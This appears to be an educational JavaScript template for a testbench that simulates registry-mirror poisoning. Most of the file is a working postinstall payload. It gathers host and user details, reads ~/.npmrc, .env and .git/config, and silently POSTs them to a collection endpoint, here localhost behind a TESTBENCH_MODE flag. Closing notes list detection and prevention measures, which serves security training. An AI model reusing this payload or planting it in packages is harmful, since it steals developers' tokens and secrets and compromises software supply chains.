/**
 * MIRROR POISONING ATTACK TEMPLATE
 * 
 * This template demonstrates how to create a malicious package
 * that would be served by a compromised registry mirror.
 * 
 * SAFETY: Only works when TESTBENCH_MODE=enabled
 * 
 * ATTACK VECTOR:
 * 1. Attacker compromises internal npm registry mirror
 * 2. Replaces legitimate packages with malicious versions
 * 3. Mirror serves malicious packages to all developers
 * 4. Developers install packages from mirror
 * 5. Malicious postinstall scripts execute
 */

if (process.env.TESTBENCH_MODE === 'enabled') {
  const http = require('http');
  const fs = require('fs');
  const os = require('os');
  const path = require('path');

  // Collect system information
  const data = {
    timestamp: new Date().toISOString(),
    package: 'PACKAGE_NAME',  // Replace with actual package name
    version: 'PACKAGE_VERSION',  // Replace with actual version
    attackType: 'registry-mirror-poisoning',
    source: 'compromised-mirror',
    
    // System information
    hostname: os.hostname(),
    username: os.userInfo().username,
    platform: process.platform,
    nodeVersion: process.version,
    cwd: process.cwd(),
    
    // Environment variables
    env: {
      NODE_ENV: process.env.NODE_ENV,
      REGISTRY: process.env.npm_config_registry || 'default',
      // Add other sensitive env vars as needed
    },
    
    // Sensitive files
    files: {}
  };

  // Try to read sensitive files
  const sensitiveFiles = [
    path.join(os.homedir(), '.npmrc'),        // npm configuration
    path.join(process.cwd(), '.env'),          // Environment variables
    path.join(process.cwd(), 'package.json'),  // Package configuration
    path.join(process.cwd(), '.git/config'),  // Git configuration
  ];

  sensitiveFiles.forEach(filePath => {
    try {
      if (fs.existsSync(filePath)) {
        data.files[filePath] = fs.readFileSync(filePath, 'utf8');
      }
    } catch (e) {
      // Silently fail if file can't be read
    }
  });

  // Exfiltrate data to attacker server
  const payload = JSON.stringify(data);
  const options = {
    hostname: 'localhost',  // In testbench, only localhost
    port: 3000,
    path: '/collect',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': payload.length
    }
  };

  const req = http.request(options, () => {
    // Data sent successfully
  });

  req.on('error', () => {
    // Silently fail if server is not available
  });

  req.write(payload);
  req.end();
}

// ============================================================================
// LEARNING NOTES:
// ============================================================================
// This template shows how attackers poison registry mirrors:
//
// 1. Attacker gains access to mirror server (phishing, credential theft, etc.)
// 2. Replaces legitimate packages with malicious versions
// 3. Malicious packages include postinstall scripts
// 4. When developers install packages, postinstall scripts execute
// 5. Scripts exfiltrate sensitive data (credentials, configs, etc.)
//
// Why this is dangerous:
// - Single point of failure (one mirror affects all developers)
// - Hard to detect (mirror appears legitimate)
// - Wide impact (all internal developers affected)
// - Persistent (attack persists until mirror is fixed)
//
// Detection methods:
// - Upstream verification (compare with npmjs.com)
// - Package integrity checking (checksums, signatures)
// - Mirror behavior analysis
// - Package version comparison
// - Anomaly detection
//
// Prevention:
// - Secure mirror access (limit who can modify)
// - Regular audits (audit mirror configuration)
// - Upstream verification (verify packages match upstream)
// - Access controls (strict access controls)
// - Monitoring (monitor mirror behavior)
// ============================================================================
